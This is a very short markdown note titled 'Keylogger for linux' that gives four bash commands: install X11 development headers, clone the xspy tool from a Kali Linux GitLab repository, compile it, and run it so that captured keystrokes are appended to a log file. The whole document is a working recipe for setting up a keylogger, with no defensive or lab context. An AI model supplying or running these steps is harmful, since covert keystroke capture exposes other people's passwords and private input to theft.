# Keylogger for linux

```bash
sudo apt install libx11-dev
git clone https://gitlab.com/kalilinux/packages/xspy
gcc Xspy.c -o xspy -lX11
xspy >> teste.log
```